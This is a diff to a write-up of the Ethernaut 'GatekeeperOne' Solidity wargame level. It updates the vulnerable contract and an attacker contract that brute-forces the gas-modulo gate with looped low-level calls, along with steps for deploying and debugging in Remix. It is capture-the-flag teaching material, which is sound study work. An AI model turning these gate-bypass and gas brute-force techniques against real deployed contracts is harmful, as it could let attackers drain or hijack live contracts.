@@ -93,48 +93,49 @@ This is for sure the most difficult part to crack. It is highly recommended to u
 
 ```
     // SPDX-License-Identifier: MIT
-    pragma solidity 0.6.0;
+    pragma solidity 0.6.4;
 
     import '../SafeMath.sol';
 
     contract GatekeeperOne {
 
-    using SafeMath for uint256;
-    address public entrant;
+        using SafeMath for uint256;
+        address public entrant;
 
-    modifier gateOne() {
-        require(msg.sender != tx.origin);
-        _;
-    }
+        modifier gateOne() {
+            require(msg.sender != tx.origin);
+            _;
+        }
 
-    modifier gateTwo() {
-        require(gasleft().mod(8191) == 0);
-        _;
-    }
+        modifier gateTwo() {
+            require(gasleft().mod(8191) == 0);
+            _;
+        }
 
-    modifier gateThree(bytes8 _gateKey) {
-        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
-        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
-        require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
-        _;
-    }
+        modifier gateThree(bytes8 _gateKey) {
+            require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+            require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+            require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
+            _;
+        }
 
-    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
-        entrant = tx.origin;
-        return true;
-    }
+        function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+            entrant = tx.origin;
+            return true;
+        }
 
     }
 
     contract GateSneakOne {
-
-        // Here is where the magic starts!
-        function callEnter(bytes8 _key, address _gateKeeper) public {
-            (bool success, ) = _gateKeeper.call(abi.encodeWithSignature("enter(bytes8)", _key)); // No gas specification so far.
-            require(success, "Oops, something went wrong :( " );
+        function callEnter(bytes8 _key, address _gateKeeperAddr, uint256 _offset, uint256 _initialGas) public returns(bool){
+            for (uint256 i = 0; i < _offset; i++) {
+            (bool success, ) = _gateKeeperAddr.call{gas: (i + _initialGas + 8191 * 4)}(abi.encodeWithSignature("enter(bytes8)", _key));
+            if(success){
+                break;
+            }
         }
-
-    }
+    }  
+    
 ```
 
 The idea is to first deploy the ```GatekeeperOne``` then ```GateSneakOne``` and after that, having the ```GatekeeperOne``` address make the ```callEnter``` call. The key can be any bytes8 date because this excecution will revert before checking that key. With the reversal, you can check that on Remix transactions feed there is a ```debug``` button next to the reverted tx. Let's debug it. 
@@ -151,7 +152,7 @@ To get the amount of gas we just need to: ```8191 * Margin + Consumed Gas``` wil
 
 ```
     // SPDX-License-Identifier: MIT
-    pragma solidity ^0.4.18;
+    pragma solidity ^0.6.4;
 
     contract Caller {
 
